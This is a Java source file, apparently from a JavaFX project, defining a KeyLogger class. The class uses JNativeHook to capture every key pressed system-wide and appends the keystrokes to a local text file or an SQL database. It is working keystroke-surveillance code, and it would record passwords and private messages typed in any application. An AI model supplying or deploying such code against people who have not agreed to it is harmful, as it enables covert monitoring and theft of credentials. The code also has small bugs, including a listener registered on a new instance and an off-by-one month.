package ch.fxlogger.fxkeylogger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.NativeInputEvent;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Calendar;


public class KeyLogger implements NativeKeyListener {
    private HelloApplication helloApplication;
    private TimeSheetController timeSheetController;



    private static final Path file = Paths.get("src/main/java/ch/fxlogger/fxkeylogger/keys.txt");

    private static String log = "";
    public void setHelloApplication(HelloApplication helloApplication) {
        this.helloApplication = helloApplication;
    }

    public void setTimeSheetController(TimeSheetController timeSheetController){
        this.timeSheetController = timeSheetController;
    }

    private OutputStream os;
    {
        try {
            os = Files.newOutputStream(
                    file,
                    StandardOpenOption.CREATE,
                    StandardOpenOption.WRITE,
                    StandardOpenOption.APPEND);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    private PrintWriter writer = new PrintWriter(os);
    private int writingInWhat = 0;

    /**
     *
     * @param what
     * 0 is logging into a file
     * 1 is logging into a database
     */
    public void setLogInWhat(final int what){
        this.writingInWhat = what;
    }

    public void run() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.exit(1);
        }
        GlobalScreen.addNativeKeyListener(new KeyLogger());

    }

    public void stop(){
        try{
            GlobalScreen.unregisterNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {

        String keyText = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());

        if (keyText.length() > 1) {
            log = log + "[" + keyText + "]";
            //timeSheetController.addTable(new Info(getDate(),"[" + keyText + "]", getTime()));
            writer.print("[" + keyText + "]");
        } else {
            log = log + keyText;
            //timeSheetController.addTable(new Info(getDate(),keyText, getTime()));
            writer.print(keyText);
        }
    }
    private String getTime() {
        DateTimeFormatter dtf = DateTimeFormatter.ofPattern("HH:mm:ss");
        LocalDateTime now = LocalDateTime.now();
        return dtf.format(now);
    }
    private String getDate() {
        Calendar calendar = Calendar.getInstance();
        int dayToday = calendar.get(Calendar.DAY_OF_MONTH);
        int monthToday = calendar.get(Calendar.MONTH);
        int yearToday = calendar.get(Calendar.YEAR);

        String ret = dayToday + "_" + monthToday + "_" + yearToday;
        return ret;
    }
    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }

    public void write(){
        System.out.println(writingInWhat);
        if(writingInWhat == 0){

            writer.write(log);
        }
        else if(writingInWhat == 1){
            SQLDatabaseConnection sqlDatabaseConnection = new SQLDatabaseConnection();
            sqlDatabaseConnection.connect();
            sqlDatabaseConnection.createTable();
            sqlDatabaseConnection.writeIntoDatabase(log);
        }
        log = "";
    }
}
